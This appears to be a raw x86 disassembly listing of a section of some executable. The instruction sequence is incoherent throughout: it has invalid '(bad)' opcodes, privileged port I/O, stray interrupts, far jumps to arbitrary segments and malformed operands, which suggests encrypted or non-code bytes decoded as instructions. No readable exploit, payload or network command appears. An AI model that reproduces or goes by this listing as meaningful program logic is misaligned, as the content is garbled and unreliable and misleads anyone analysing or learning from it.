  425e23:	mov    eax,ds:0x9e449136
  425e28:	jl     0x425dbb
  425e2a:	mov    cl,0xf8
  425e2c:	int3   
  425e2d:	test   eax,0x2b939fd1
  425e32:	outs   dx,DWORD PTR ds:[esi]
  425e33:	lods   eax,DWORD PTR ds:[esi]
  425e34:	lds    ebx,FWORD PTR [eax+eax*8]
  425e37:	test   al,0x81
  425e39:	jg     0x425e21
  425e3b:	mov    bh,0x1d
  425e3d:	mov    ds,WORD PTR [eax+edi*4+0x17]
  425e41:	add    DWORD PTR [ecx-0x3e],0x2b
  425e45:	or     BYTE PTR [ebx+0xd3ed0dc],al
  425e4b:	add    DWORD PTR [esi+edi*4-0x56],ecx
  425e4f:	stos   BYTE PTR es:[edi],al
  425e50:	lock loopne 0x425e00
  425e53:	imul   BYTE PTR [edi+edi*2]
  425e56:	add    eax,0x92dc3611
  425e5b:	fmul   DWORD PTR gs:[ecx+edi*8-0x55e9e08]
  425e63:	retf   
  425e64:	inc    ebp
  425e65:	aaa    
  425e66:	sub    al,0xe2
  425e68:	int    0x52
  425e6a:	ins    DWORD PTR es:[edi],dx
  425e6b:	out    0x19,al
  425e6d:	xor    esp,DWORD PTR [esi-0x765d3b79]
  425e73:	pop    ebx
  425e74:	mov    ecx,0xa9f9d24a
  425e79:	pop    ebx
  425e7a:	sbb    cl,al
  425e7c:	jl     0x425eb4
  425e7e:	sub    BYTE PTR [ebp+0x2abff121],dh
  425e84:	scas   al,BYTE PTR es:[edi]
  425e85:	js     0x425e3e
  425e87:	adc    ch,BYTE PTR [ebx+edi*1-0x5bead618]
  425e8e:	into   
  425e8f:	std    
  425e90:	add    esi,0xffffffa5
  425e93:	cdq    
  425e94:	inc    esi
  425e95:	and    ch,cl
  425e97:	ficomp WORD PTR [edi]
  425e99:	ja     0x425e3b
  425e9b:	add    DWORD PTR [edx+0x1b],esi
  425e9e:	adc    BYTE PTR [ecx+ebp*2-0x62b0d8f3],bl
  425ea5:	stos   BYTE PTR es:[edi],al
  425ea6:	xor    eax,DWORD PTR [edx+0x1f]
  425ea9:	or     ebx,edi
  425eab:	xchg   esp,eax
  425eac:	push   es
  425ead:	inc    edx
  425eae:	jg     0x425ed1
  425eb0:	mov    al,ds:0xc9b8bf57
  425eb5:	jge    0x425ee0
  425eb7:	push   ebp
  425eb8:	(bad)  
  425eb9:	out    0xe8,al
  425ebb:	sbb    DWORD PTR [ecx],ebx
  425ebd:	push   ebx
  425ebe:	xchg   ebp,eax
  425ebf:	test   eax,0xe85c6b33
  425ec4:	pop    esp
  425ec5:	mov    dl,BYTE PTR [ecx-0x19c49bc6]
  425ecb:	mov    ch,0x14
  425ecd:	xor    ch,BYTE PTR [edx+0x38bb16e1]
  425ed3:	aas    
  425ed4:	arpl   WORD PTR [esi],dx
  425ed6:	pop    esi
  425ed7:	push   esp
  425ed8:	push   es
  425ed9:	mov    ecx,DWORD PTR [ecx+0x7ed7107a]
  425edf:	xchg   DWORD PTR [ecx+esi*4+0x2f],esp
  425ee3:	push   ebp
  425ee4:	xor    al,0xcd
  425ee6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ee7:	outs   dx,DWORD PTR ds:[esi]
  425ee8:	pop    ss
  425ee9:	push   edx
  425eea:	call   ecx
  425eec:	sahf   
  425eed:	call   0x7f2028c9
  425ef2:	ins    DWORD PTR es:[edi],dx
  425ef3:	xlat   BYTE PTR ds:[ebx]
  425ef4:	jno    0x425f16
  425ef6:	imul   esi,DWORD PTR [eax+0xe],0x430653f3
  425efd:	mov    WORD PTR [ebx+edx*8+0x72],es
  425f01:	ds mov ch,ch
  425f04:	or     eax,0x2eb56468
  425f09:	add    al,BYTE PTR [edi+0x1c76650f]
  425f0f:	outs   dx,BYTE PTR ds:[esi]
  425f10:	mov    DWORD PTR [edx-0xc],0x1348c3e7
  425f17:	sub    DWORD PTR [edi],edx
  425f19:	mov    edx,0x4ead605
  425f1e:	aas    
  425f1f:	out    0x58,al
  425f21:	cmp    eax,0xa2be2b58
  425f26:	inc    eax
  425f27:	aad    0x8c
  425f29:	push   ebp
  425f2a:	jae    0x425ed2
  425f2c:	jge    0x425f48
  425f2e:	dec    edx
  425f2f:	push   edx
  425f30:	push   ss
  425f31:	je     0x425f69
  425f33:	leave  
  425f34:	fbld   TBYTE PTR [esi-0x35]
  425f37:	(bad)  
  425f38:	int    0x9d
  425f3a:	ins    BYTE PTR es:[edi],dx
  425f3b:	jno    0x425ee4
  425f3d:	inc    esp
  425f3e:	xchg   edi,eax
  425f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f40:	cwde   
  425f41:	test   al,0xf4
  425f43:	dec    edi
  425f44:	jbe    0x425f7c
  425f46:	xchg   ebp,eax
  425f47:	pushf  
  425f48:	fisubr DWORD PTR [edi]
  425f4a:	int    0x85
  425f4c:	sub    ebp,esp
  425f4e:	and    al,0x53
  425f50:	sub    edx,DWORD PTR ds:0x81d71d61
  425f56:	cmp    esp,DWORD PTR [bp+0x21e8]
  425f5b:	xor    dl,BYTE PTR [edi+0x4b]
  425f5e:	int    0xf5
  425f60:	and    BYTE PTR [edi],cl
  425f62:	jmp    0x425fd1
  425f64:	mov    cl,0xb6
  425f66:	bound  edi,QWORD PTR [ecx-0x7d7fc58d]
  425f6c:	pop    edx
  425f6d:	jmp    0x425fe2
  425f6f:	and    al,0xd2
  425f71:	dec    esi
  425f72:	xor    DWORD PTR [ebp+edi*8+0x35],ecx
  425f76:	cli    
  425f77:	mov    eax,0x79437a82
  425f7c:	push   edx
  425f7d:	in     al,0x81
  425f7f:	ins    DWORD PTR es:[edi],dx
  425f80:	add    ebp,0x20
  425f83:	mov    ds:0x90a8059a,al
  425f88:	fst    QWORD PTR [ecx+0x7f]
  425f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f8c:	daa    
  425f8d:	dec    ecx
  425f8e:	xchg   ah,dl
  425f90:	fnstcw WORD PTR [ecx+0xda6e14a]
  425f96:	imul   ebx,DWORD PTR [edx],0x51
  425f99:	mov    bh,BYTE PTR [eax]
  425f9b:	add    DWORD PTR [ebp+0x17],ebx
  425f9e:	enter  0xb9d1,0x2
  425fa2:	in     al,dx
  425fa3:	aam    0x5c
  425fa5:	rcr    edx,0x46
  425fa8:	ss add eax,eax
  425fab:	push   ebx
  425fac:	sbb    bl,dl
  425fae:	sbb    eax,edi
  425fb0:	mov    gs,esi
  425fb2:	xchg   ebp,eax
  425fb3:	mov    ebp,0x27c7ca1f
  425fb8:	mov    edi,gs
  425fba:	inc    edx
  425fbb:	sub    al,0xb5
  425fbd:	aas    
  425fbe:	es mov ecx,0xd017e84e
  425fc4:	and    eax,0xef0dac16
  425fc9:	adc    esi,DWORD PTR [ecx+0x49]
  425fcc:	inc    edx
  425fcd:	mov    DWORD PTR [edi-0x36],edi
  425fd0:	or     ecx,DWORD PTR [ecx+0x32]
  425fd3:	push   ebx
  425fd4:	dec    edi
  425fd5:	pop    es
  425fd6:	mov    ebp,0x3b675fef
  425fdb:	mov    WORD PTR [ebx+0x4c1f3252],cs
  425fe1:	mov    WORD PTR [ebx],ss
  425fe3:	jmp    0x52f894be
  425fe8:	hlt    
  425fe9:	and    dl,cl
  425feb:	and    DWORD PTR [eax+0x7905c0cd],ecx
  425ff1:	push   ebp
  425ff2:	test   BYTE PTR [ebx],0x5c
  425ff5:	in     eax,0xc2
  425ff7:	push   ss
  425ff8:	imul   esi,eax,0x24
  425ffb:	dec    esi
  425ffc:	shl    ah,cl
  425ffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425fff:	lods   al,BYTE PTR ds:[esi]
  426001:	fsubr  st,st(4)
  426003:	lock xchg ecx,eax
  426005:	out    dx,al
  426006:	out    dx,al
  426007:	aas    
  426008:	ja     0x42605a
  42600a:	inc    ebx
  42600b:	cmp    dl,BYTE PTR [ebx+0x3f8a7e00]
  426011:	fstp   st(7)
  426013:	mov    es:0xdda927ba,eax
  426019:	shl    esi,cl
  42601b:	and    bh,ch
  42601d:	mov    dl,0xe1
  42601f:	mov    esi,0xf6b5b59b
  426024:	retf   
  426025:	push   0xffffffc5
  426027:	mov    al,ds:0xfef274c4
  42602c:	push   cs
  42602d:	mov    ds,edi
  42602f:	cmp    eax,0x1c8b7c89
  426034:	push   ds
  426035:	imul   eax,DWORD PTR [ebx],0xcb28f78d
  42603b:	push   ds
  42603c:	or     BYTE PTR [eax+0x4b],dh
  42603f:	iret   
  426040:	or     ah,BYTE PTR [eax-0x33]
  426043:	sar    DWORD PTR [ebx],0xa2
  426046:	xor    BYTE PTR [ebp+0x2b],dl
  426049:	pop    esp
  42604a:	ds repz je 0x426098
  42604e:	push   es
  42604f:	xchg   esi,eax
  426050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426051:	jno    0x42607a
  426053:	mov    ah,0x64
  426055:	fcomp  st(5)
  426057:	retf   0x978d
  42605a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42605b:	enter  0x7de,0x3f
  42605f:	daa    
  426060:	push   esi
  426061:	les    eax,FWORD PTR [edi+0x1a]
  426064:	daa    
  426065:	div    DWORD PTR [esi+eax*8]
  426068:	test   DWORD PTR [ebx],0x48975796
  42606e:	mov    eax,0x8b33d72b
  426073:	jae    0x426032
  426075:	add    edx,edx
  426077:	xchg   esi,eax
  426078:	xchg   BYTE PTR [ebx],bh
  42607a:	push   edx
  42607b:	jno    0x426015
  42607d:	mov    ?,esp
  42607f:	cli    
  426080:	jmp    0xac363929
  426085:	hlt    
  426086:	(bad)  
  426087:	xchg   ebx,eax
  426088:	loopne 0x426048
  42608a:	mov    esp,0x314adc63
  42608f:	fisub  WORD PTR [edi]
  426091:	loopne 0x42606a
  426093:	xchg   ecx,eax
  426094:	addr16 mov bl,0x45
  426097:	add    DWORD PTR [edx-0x79],0xffffffa0
  42609b:	or     ebp,esi
  42609d:	add    eax,0x9f321f6d
  4260a2:	addr16 cmp bh,cl
  4260a5:	(bad)  
  4260a6:	mov    BYTE PTR [esi+0x4f3ceca0],0x1a
  4260ad:	inc    edx
  4260ae:	shr    dl,0x24
  4260b1:	mov    bh,0x99
  4260b3:	call   0x4fa081f8
  4260b8:	lahf   
  4260b9:	js     0x4260a0
  4260bb:	loopne 0x426040
  4260bd:	or     eax,0xd1616e8c
  4260c2:	push   esp
  4260c3:	pop    esp
  4260c4:	rcr    BYTE PTR [eax],1
  4260c6:	or     al,0x9f
  4260c8:	adc    al,0x1b
  4260ca:	mov    al,dh
  4260cc:	xor    cl,al
  4260ce:	xor    edx,esi
  4260d0:	push   ebp
  4260d1:	jne    0x426149
  4260d3:	pushf  
  4260d4:	add    edi,esp
  4260d6:	sar    BYTE PTR [edi-0x27],0x7
  4260da:	sahf   
  4260db:	lds    edx,FWORD PTR [ebp+0x12]
  4260de:	sub    dh,BYTE PTR [ecx]
  4260e0:	inc    esp
  4260e1:	lods   al,BYTE PTR ds:[esi]
  4260e2:	gs fs mov ecx,0xb788c874
  4260e9:	hlt    
  4260ea:	pop    es
  4260eb:	xlat   BYTE PTR ds:[ebx]
  4260ec:	or     BYTE PTR [ecx-0xbf899ce],bh
  4260f2:	call   0x5f293239
  4260f7:	jge    0x426164
  4260f9:	adc    dh,BYTE PTR [edi+0x5f19916e]
  4260ff:	test   eax,0x8635c1b9
  426104:	pop    es
  426105:	das    
  426106:	push   ebp
  426107:	je     0x426091
  426109:	mov    bl,0x43
  42610b:	inc    ebp
  42610c:	dec    esi
  42610d:	pop    ebx
  42610e:	ds pusha 
  426110:	pushf  
  426111:	pop    eax
  426112:	or     al,0x28
  426114:	call   0x6f5e:0x7a3ccbed
  42611b:	imul   esp,DWORD PTR [eax-0x2e],0xfa536d6b
  426122:	jne    0x426133
  426124:	xor    eax,0xc9506a49
  426129:	sub    al,0x52
  42612b:	rcl    dh,cl
  42612d:	mov    ebp,DWORD PTR [ebx+0x35]
  426130:	or     al,0xd9
  426132:	mov    edx,0xaf2eb053
  426137:	jmp    0x2ae8:0x58770500
  42613e:	test   DWORD PTR [ebp+0x100d0a],eax
  426144:	cmp    al,0x5e
  426146:	fild   WORD PTR [eax-0x3a]
  426149:	and    cl,BYTE PTR [edx]
  42614b:	prefetcht1 BYTE PTR [esi]
  42614e:	mov    ecx,0x1e771eb9
  426153:	cmp    eax,0x8d49e26e
  426158:	fdivr  QWORD PTR [edi-0x76c589a4]
  42615e:	cmp    DWORD PTR [edi-0x1dad2e61],0xffffffbb
  426165:	fdivr  QWORD PTR [eax]
  426167:	jnp    0x4260f1
  426169:	inc    ebx
  42616a:	cmc    
  42616b:	mov    esp,0x55c43d39
  426170:	adc    dh,ah
  426172:	ffreep st(0)
  426174:	fisttp DWORD PTR [esi-0x7337d61f]
  42617a:	ror    BYTE PTR [eax+0x552407ed],cl
  426180:	pushf  
  426181:	repnz jmp 0x8487:0x3e891ad1
  426189:	pop    ds
  42618a:	or     DWORD PTR [edx],ebp
  42618c:	or     eax,DWORD PTR [ebx+ecx*8+0x7f9ce47e]
  426193:	bnd jbe 0x4261ee
  426196:	xchg   esi,eax
  426197:	lods   eax,DWORD PTR ds:[esi]
  426198:	and    DWORD PTR [esi],0xffffffb9
  42619b:	das    
  42619c:	mov    esi,0xf962147d
  4261a1:	push   ebx
  4261a2:	into   
  4261a3:	aad    0x6
  4261a5:	xor    DWORD PTR [esi+0x5],0x561c4925
  4261ac:	fld    st(6)
  4261ae:	sbb    eax,0x1160456a
  4261b3:	xchg   esp,eax
  4261b4:	dec    ebp
  4261b5:	mov    edi,0xb7e6c4c9
  4261ba:	pop    edx
  4261bb:	sub    al,0x95
  4261bd:	bound  esp,QWORD PTR [ebx-0x3]
  4261c0:	add    al,0x98
  4261c2:	inc    ebp
  4261c3:	in     eax,0xc2
  4261c5:	inc    esi
  4261c6:	bound  ebp,QWORD PTR [esi-0x31]
  4261c9:	call   0xd012ca15
  4261ce:	jg     0x426195
  4261d0:	pop    ss
  4261d1:	inc    ecx
  4261d2:	and    BYTE PTR [ecx-0x6a],0xf1
  4261d6:	(bad)  
  4261d8:	lods   al,BYTE PTR ds:[esi]
  4261d9:	inc    edi
  4261da:	push   cs
  4261db:	sub    DWORD PTR [ebp-0x5f],0x85ce43e0
  4261e2:	mov    ds:0xf0804b81,eax
  4261e7:	xlat   BYTE PTR ds:[ebx]
  4261e8:	push   edi
  4261e9:	int3   
  4261ea:	cmp    bh,BYTE PTR [edx-0x5694b301]
  4261f0:	shl    BYTE PTR [ebx+0x29ac6213],1
  4261f6:	(bad)  
  4261f7:	in     eax,dx
  4261f8:	fsubr  DWORD PTR [eax-0x59d7b70d]
  4261fe:	mov    es,WORD PTR [ecx+0x3f]
  426201:	sub    BYTE PTR [ebx-0x4c],ch
  426204:	sub    al,0x6d
  426206:	cmp    BYTE PTR ds:0xc18e60cf,al
  42620c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42620d:	xchg   ecx,eax
  42620e:	(bad)  
  42620f:	adc    DWORD PTR [ebp-0x23deae35],ebp
  426215:	jne    0x4261c7
  426217:	fmul   QWORD PTR [eax-0x1af9dee2]
  42621d:	xchg   ecx,eax
  42621e:	adc    DWORD PTR [edi+esi*4+0x19],ebp
  426222:	in     eax,0xa5
  426224:	int    0xf
  426226:	cmp    ch,dl
  426228:	push   esi
  426229:	jp     0x4261fa
  42622b:	rcr    BYTE PTR [ecx-0x34],0x4e
  42622f:	xchg   edx,eax
  426230:	or     DWORD PTR [esi+0x180b6dc],esi
  426236:	int    0x16
  426238:	xchg   esp,eax
  426239:	cmp    bh,0x9c
  42623c:	jle    0x426256
  42623e:	ds jae 0x426253
  426241:	push   edx
  426242:	xchg   DWORD PTR ds:0x10d7d5e8,ebx
  426248:	ror    DWORD PTR [ecx-0x60],0xd9
  42624c:	call   0x24ab2011
  426251:	scas   al,BYTE PTR es:[edi]
  426252:	ja     0x42620a
  426254:	and    al,0x5
  426256:	addr16 and ebx,edi
  426259:	call   0x49b4:0x3d758a18
  426260:	jns    0x42622a
  426262:	jbe    0x426275
  426264:	icebp  
  426265:	mov    esp,0x1e9c3e91
  42626a:	fsub   st(1),st
  42626c:	mov    edi,0x94c5bbdc
  426271:	icebp  
  426272:	adc    dl,ch
  426274:	mov    ebp,0xc0e89189
  426279:	cdq    
  42627a:	xchg   edi,eax
  42627b:	mov    bl,0x8c
  42627d:	inc    ebx
  42627e:	mov    edi,0x75a6b4f
  426283:	popf   
  426284:	lea    ebx,[eax-0x6a69306f]
  42628a:	or     eax,0xf77895f8
  42628f:	pop    eax
  426290:	jae    0x4262b4
  426292:	add    BYTE PTR [ecx+0x7a650770],cl
  426298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426299:	mov    WORD PTR [eax+edi*8+0x51],fs
  42629d:	aam    0xf1
  42629f:	sbb    BYTE PTR [esi+0x50c3072],ch
  4262a5:	int3   
  4262a6:	sbb    edx,DWORD PTR [edi+0x7d]
  4262a9:	lds    esp,FWORD PTR [ecx]
  4262ab:	fldenv [esi+eiz*1+0xb39e078]
  4262b2:	xor    BYTE PTR [edx],0x46
  4262b5:	icebp  
  4262b6:	into   
  4262b7:	push   ebp
  4262b8:	and    cl,al
  4262ba:	aad    0xf4
  4262bc:	stos   DWORD PTR es:[edi],eax
  4262bd:	rcr    BYTE PTR [ebp+0x6ab1b1f6],cl
  4262c3:	xor    BYTE PTR cs:[ebx+0x54],al
  4262c7:	call   0x53dd:0x6ad10002
  4262ce:	sti    
  4262cf:	jg     0x4262e8
  4262d1:	fstp   st(3)
  4262d3:	dec    ebp
  4262d4:	push   eax
  4262d5:	adc    esi,DWORD PTR es:[eax]
  4262d8:	xchg   DWORD PTR [esi-0x44],ecx
  4262db:	cdq    
  4262dc:	mov    cl,0x8b
  4262de:	xchg   ebp,eax
  4262df:	repnz or eax,0x40eb177
  4262e5:	pop    edi
  4262e6:	mov    eax,ds:0x712444f7
  4262eb:	sbb    al,0x5e
  4262ed:	or     al,0x98
  4262ef:	imul   eax,esi,0x71
  4262f2:	int    0x8e
  4262f4:	sub    BYTE PTR ds:0xf2857a6a,0x86
  4262fb:	cld    
  4262fc:	int3   
  4262fd:	bound  esi,QWORD PTR [eax+0x1a29187]
  426303:	pop    edx
  426304:	push   ebx
  426305:	lods   al,BYTE PTR ds:[esi]
  426306:	retf   
  426307:	test   DWORD PTR [edi+0x77aada2b],ebx
  42630d:	jecxz  0x4262d3
  42630f:	repz and edx,esp
  426312:	out    dx,eax
  426313:	jbe    0x4262fc
  426315:	sbb    edx,esp
  426317:	lods   eax,DWORD PTR ds:[esi]
  426318:	enter  0xd8f4,0xe0
  42631c:	jns    0x426315
  42631e:	aam    0xe9
  426320:	adc    BYTE PTR [ebx],dh
  426322:	xchg   ebx,eax
  426323:	out    0x39,al
  426325:	xchg   ecx,eax
  426326:	popa   
  426327:	push   0xe96520a1
  42632c:	xor    eax,0x96b36ad0
  426331:	mov    bh,ah
  426333:	sub    bl,BYTE PTR [edx+0x342f6f0a]
  426339:	cmp    DWORD PTR [edi-0x42],eax
  42633c:	push   DWORD PTR [ebx-0x70664922]
  426342:	cwde   
  426343:	ds hlt 
  426345:	push   edx
  426346:	or     edi,DWORD PTR [ebx+0x6958442b]
  42634c:	sub    al,0x55
  42634e:	mov    bl,0x44
  426350:	jbe    0x42632b
  426352:	in     al,dx
  426353:	pop    edi
  426354:	leave  
  426355:	in     eax,dx
  426356:	mulps  xmm7,xmm4
  426359:	cmp    dh,BYTE PTR [edi-0x24]
  42635c:	mov    ?,WORD PTR [eax]
  42635e:	push   ss
  42635f:	xor    DWORD PTR [esi+0x17d86def],esi
  426365:	inc    esi
  426366:	ror    DWORD PTR [ebp-0x43],1
  426369:	mov    bl,BYTE PTR [edi+0x37f57fda]
  42636f:	mov    ax,ds:0xc7279513
  426375:	pop    ecx
  426376:	sbb    DWORD PTR [eax],ecx
  426378:	push   es
  426379:	inc    edi
  42637a:	int    0xfa
  42637c:	push   ss
  42637d:	cmp    al,0xcc
  42637f:	mov    al,0xbd
  426381:	pop    edi
  426382:	dec    ebx
  426383:	xchg   ebp,eax
  426384:	push   eax
  426385:	cmp    DWORD PTR [edx],ebp
  426387:	js     0x42638b
  426389:	sbb    ecx,edi
  42638b:	sub    eax,0xacc80da
  426390:	pusha  
  426391:	shl    DWORD PTR [edx-0x218710ab],1
  426397:	std    
  426398:	fild   QWORD PTR ds:0x3ac68dce
  42639e:	jmp    0x1740:0x9b8a061
  4263a5:	pushf  
  4263a6:	cmp    cl,BYTE PTR [esi]
  4263a8:	xchg   edi,eax
  4263a9:	push   cs
  4263aa:	imul   DWORD PTR [ebp-0x2e918f11]
  4263b0:	out    0x0,al
  4263b2:	std    
  4263b3:	xor    eax,0x96b9dd66
  4263b8:	xor    BYTE PTR [edi+0x25324c92],dh
  4263be:	shr    DWORD PTR [ecx],cl
  4263c0:	cmp    DWORD PTR [esi-0x55],edx
  4263c3:	push   es
  4263c4:	mov    edi,0x6c3ba3d2
  4263c9:	sbb    ebp,DWORD PTR ds:0x714188f7
  4263cf:	mov    edx,0x2b75447f
  4263d4:	xchg   edx,eax
  4263d5:	call   0xaa80ce21
  4263da:	out    0xd8,al
  4263dc:	leave  
  4263dd:	xor    al,0xd6
  4263df:	js     0x42640d
  4263e1:	out    0xb5,al
  4263e3:	int3   
  4263e4:	and    ebx,edx
  4263e6:	dec    eax
  4263e7:	and    esp,esi
  4263e9:	ret    
  4263ea:	fist   WORD PTR [esi]
  4263ec:	fcomip st,st(3)
  4263ee:	aaa    
  4263ef:	inc    edx
  4263f0:	out    dx,eax
  4263f1:	push   ds
  4263f2:	bound  edx,QWORD PTR [eax+0x50349f12]
  4263f8:	cld    
  4263f9:	popf   
  4263fa:	enter  0xab73,0xb
  4263fe:	adc    bl,bh
  426400:	xchg   esp,eax
  426401:	jae    0x42639b
  426403:	das    
  426404:	inc    ecx
  426405:	push   0x238f2c59
  42640a:	shl    DWORD PTR [ebp+0x513d9428],1
  426410:	adc    edx,DWORD PTR [eax]
  426412:	retf   
  426413:	xlat   BYTE PTR ds:[ebx]
  426414:	(bad)  
  426415:	(bad)  
  426416:	popf   
  426417:	mov    al,BYTE PTR es:[eax+0x8e192d]
  42641e:	mov    eax,ds:0x56452874
  426423:	das    
  426424:	pusha  
  426425:	push   ebx
  426426:	inc    esi
  426427:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  426429:	push   esp
  42642a:	inc    edx
  42642b:	pop    ebx
  42642c:	dec    edi
  42642d:	pop    ebp
  42642e:	jle    0x42646e
  426430:	mov    ah,0x70
  426432:	and    bl,al
  426434:	sbb    eax,0x990ea547
  426439:	mov    bl,0xf3
  42643b:	or     edi,DWORD PTR [ebx-0x6779a87e]
  426441:	push   ds
  426442:	in     al,dx
  426443:	imul   edi,DWORD PTR [esi+0x1bdbd2e1],0xcc5e2b6d
  42644d:	fisub  WORD PTR [ebx-0x72]
  426450:	pop    eax
  426451:	dec    ecx
  426452:	pop    es
  426453:	jmp    0xfb15:0x4d383e66
  42645a:	lds    esp,FWORD PTR [edx]
  42645c:	stc    
  42645d:	pop    ebx
  42645e:	sbb    BYTE PTR [eax+0x10],ch
  426461:	pop    edx
  426462:	pop    ds
  426463:	mov    ah,0xb1
  426465:	pop    ss
  426466:	pop    es
  426467:	mov    ebp,DWORD PTR [bp+si-0x50fc]
  42646c:	in     eax,dx
  42646d:	xchg   ecx,eax
  42646e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42646f:	add    dl,BYTE PTR [edx-0x4cfa50ee]
  426475:	(bad)  [ecx-0x3b]
  426478:	and    al,0xe0
  42647a:	mov    ebx,0xb02ef6fa
  42647f:	or     eax,0x6f3d6442
  426484:	retf   0x9dc3
  426487:	mov    ebx,0x1440db1d
  42648c:	data16 test BYTE PTR [ebx],ch
  42648f:	push   ebx
  426490:	(bad)
  426493:	pop    ebx
  426494:	mov    WORD PTR [eax],es
	...
  426512:	add    BYTE PTR [eax],al
  426514:	mov    edi,0xed95a576
  426519:	xlat   BYTE PTR ds:[ebx]
  42651a:	mov    edi,0xa0a36c7e
  42651f:	sar    BYTE PTR [eax-0x2c],0x59
  426523:	mov    DWORD PTR [edi-0xa],eax
  426526:	add    DWORD PTR [eax],eax
  426528:	imul   eax,DWORD PTR [edi],0x5f1b0000
  42652e:	inc    eax
  42652f:	xor    bh,BYTE PTR [esi-0x68cc97b8]
  426535:	push   0x2fababb6
  42653a:	or     al,0x7e
  42653c:	xchg   ebx,eax
  42653d:	cdq    
  42653e:	fdiv   DWORD PTR [ebp-0x58]
  426541:	loopne 0x4264fb
  426543:	xchg   ecx,eax
  426544:	fwait
  426545:	mov    BYTE PTR [edx+0x5e76e278],0x8c
  42654c:	xlat   BYTE PTR ds:[ebx]
  42654d:	test   al,0x59
  42654f:	inc    eax
  426550:	sbb    ecx,ecx
  426552:	js     0x4265b9
  426554:	ins    DWORD PTR es:[edi],dx
  426555:	dec    edi
  426556:	icebp  
  426557:	ds in  eax,0x12
  42655a:	sub    DWORD PTR [esi+0x29],esi
  42655d:	sti    
  42655e:	fstp   TBYTE PTR [ecx-0x62ea3e1e]
  426564:	add    eax,0x46f395f5
  426569:	aas    
  42656a:	lea    edx,[esi+eiz*2]
  42656d:	call   0x68da7ad1
  426572:	cmp    al,0xd2
  426574:	scas   eax,DWORD PTR es:[edi]
  426575:	mov    edi,DWORD PTR [ebx+0x78]
  426578:	clc    
  426579:	dec    edi
  42657a:	ror    DWORD PTR [edi],1
  42657c:	pushf  
  42657d:	clc    
  42657e:	test   eax,0x84c4ed32
  426583:	les    esp,FWORD PTR [edx]
  426585:	pop    ss
  426586:	sahf   
  426587:	inc    edi
  426588:	(bad)  
  426589:	or     BYTE PTR [edx],dh
  42658b:	push   0x6cfca28f
  426590:	mov    dh,dh
  426592:	shl    DWORD PTR [eax+edx*2+0x22],cl
  426596:	xor    DWORD PTR [ebp+0x2c],ebp
  426599:	pop    ecx
  42659a:	pop    ds
  42659b:	xchg   ebx,eax
  42659c:	jg     0x42660f
  42659e:	cld    
  42659f:	(bad)  
  4265a0:	sbb    BYTE PTR [ecx+eiz*2+0x616c91dd],ah
  4265a7:	push   0xffffffda
  4265a9:	mov    ecx,0xf7795388
  4265ae:	out    dx,al
  4265af:	inc    edx
  4265b0:	xchg   edx,eax
  4265b1:	pop    ecx
  4265b2:	scas   al,BYTE PTR es:[edi]
  4265b3:	rcr    DWORD PTR [ebx+0x3e412b06],0x93
  4265ba:	xlat   BYTE PTR ds:[ebx]
  4265bb:	jg     0x4265ad
  4265bd:	cmp    eax,0xabab476d
  4265c2:	adc    esi,DWORD PTR [eax-0x78]
  4265c5:	dec    ecx
  4265c6:	add    al,0xf2
  4265c8:	lds    ecx,FWORD PTR [ecx-0x44]
  4265cb:	push   esp
  4265cc:	sbb    eax,0xeed27ed1
  4265d1:	call   0x7537:0xfcbe4f6b
  4265d8:	loopne 0x42663a
  4265da:	lods   al,BYTE PTR ds:[esi]
  4265db:	scas   al,BYTE PTR es:[edi]
  4265dc:	lods   eax,DWORD PTR ds:[esi]
  4265dd:	aas    
  4265de:	jg     0x4265a3
  4265e0:	pop    edi
  4265e1:	(bad)  
  4265e3:	sbb    al,cl
  4265e5:	sbb    esi,eax
  4265e7:	js     0x42656a
  4265e9:	inc    ebx
  4265ea:	aam    0xa6
  4265ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265ed:	iret   
  4265ee:	push   edx
  4265ef:	mov    ebp,0x431946a3
  4265f4:	loope  0x42657d
  4265f6:	dec    edi
  4265f7:	aad    0x1e
  4265f9:	adc    DWORD PTR [eax],edi
  4265fb:	stc    
  4265fc:	push   0xb5166c6f
  426601:	jne    0x42661d
  426603:	scas   eax,DWORD PTR es:[edi]
  426604:	or     BYTE PTR [edi],0xa9
  426607:	outs   dx,DWORD PTR ds:[esi]
  426608:	jge    0x426683
  42660a:	call   0x3922ccfc
  42660f:	ins    DWORD PTR es:[edi],dx
  426610:	je     0x42661b
  426612:	fimul  WORD PTR [esi+0x41146e4e]
  426618:	jne    0x4265a1
  42661a:	jmp    0xe47d26c8
  42661f:	xor    al,dh
  426621:	test   al,0x86
  426623:	inc    ebp
  426624:	mov    ch,0x96
  426626:	jae    0x42669d
  426628:	rcr    ebp,0xf0
  42662b:	mov    bl,0x8a
  42662d:	cdq    
  42662e:	sbb    dh,BYTE PTR [edx+0x740052ed]
  426634:	hlt    
  426635:	bnd jnp 0x4266b4
  426638:	push   eax
  426639:	pop    ebp
  42663a:	fisub  DWORD PTR [ecx]
  42663c:	cmp    BYTE PTR [edx-0x462175fe],0x4c
  426643:	repnz cwde 
  426645:	jl     0x426642
  426647:	dec    edx
  426648:	out    0x28,al
  42664a:	xor    DWORD PTR [eax],edi
  42664c:	jbe    0x42669f
  42664e:	sub    BYTE PTR [ebx],0xc9
  426651:	(bad)  
  426652:	loop   0x426672
  426654:	adc    dh,BYTE PTR ds:0x511a6b9e
  42665a:	add    edi,ecx
  42665c:	mov    esi,0x4b045558
  426661:	or     eax,0x2f6d2eb7
  426666:	mov    dl,0x84
  426668:	mov    esi,ecx
  42666a:	dec    ebp
  42666b:	jb     0x426670
  42666d:	adc    DWORD PTR [ebp+ecx*1-0x72785d6d],esi
  426674:	push   ds
  426675:	ret    
  426676:	fsubr  QWORD PTR [edx+0x3504af87]
  42667c:	dec    ecx
  42667d:	dec    ecx
  42667e:	jmp    0xa0ed:0xb8711638
  426685:	inc    edx
  426686:	retf   0xb720
  426689:	inc    edx
  42668a:	mov    al,ds:0xd9372c10
  42668f:	(bad)  
  426690:	(bad)  
  426691:	lods   eax,DWORD PTR ds:[esi]
